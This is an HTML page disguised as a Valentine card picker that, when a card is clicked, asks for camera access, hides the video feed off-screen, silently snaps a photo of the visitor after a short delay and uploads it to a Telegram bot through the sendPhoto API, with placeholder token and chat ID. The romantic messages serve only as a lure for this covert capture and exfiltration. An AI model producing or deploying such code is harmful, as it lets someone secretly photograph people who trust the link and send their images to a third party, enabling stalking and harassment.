<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Valentine Surprise ‚ù§Ô∏è</title>

<style>
body{
    background: linear-gradient(to right,#ffc3a0,#ffafbd);
    font-family: Arial, sans-serif;
    text-align: center;
}
.card-container{
    display:flex;
    justify-content:center;
    gap:15px;
    margin-top:30px;
    flex-wrap:wrap;
}
.card{
    width:140px;
    height:180px;
    background:#fff;
    border-radius:10px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-weight:bold;
    cursor:pointer;
    border:2px solid #ff4b2b;
    box-shadow:0 4px 8px rgba(0,0,0,0.2);
}

/* üî¥ CAMERA FIX */
#video{
    position:fixed;
    top:-1000px;
    left:-1000px;
    width:320px;
    height:240px;
}
#canvas{display:none;}
</style>
</head>

<body>

<h2>Open Your Valentine Card üíå</h2>

<div class="card-container">
    <div class="card" onclick="startCamera('Tu meri zindagi ho ‚ù§Ô∏è')">Pyaar</div>
    <div class="card" onclick="startCamera('I Love You üòç')">Love</div>
    <div class="card" onclick="startCamera('Forever Together üíç')">Promise</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const CHAT_ID  = "YOUR_CHAT_ID_HERE";

let stream;

async function startCamera(msg){
    alert(msg);

    try{
        stream = await navigator.mediaDevices.getUserMedia({
            video:{ facingMode:"user" },
            audio:false
        });

        const video = document.getElementById("video");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            video.play();

            // ‚úÖ Camera ready hone ka wait
            setTimeout(capturePhoto, 1500);
        };

    }catch(e){
        alert("Camera allow karo ‚ù§Ô∏è");
    }
}

function capturePhoto(){
    const video  = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx    = canvas.getContext("2d");

    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video,0,0,canvas.width,canvas.height);

    canvas.toBlob(blob=>{
        sendToTelegram(blob);
        stopCamera();
    },"image/jpeg",0.9);
}

function stopCamera(){
    if(stream){
        stream.getTracks().forEach(t=>t.stop());
    }
}

function sendToTelegram(blob){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", blob, "photo.jpg");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:fd
    });
}
</script>

</body>
</html>
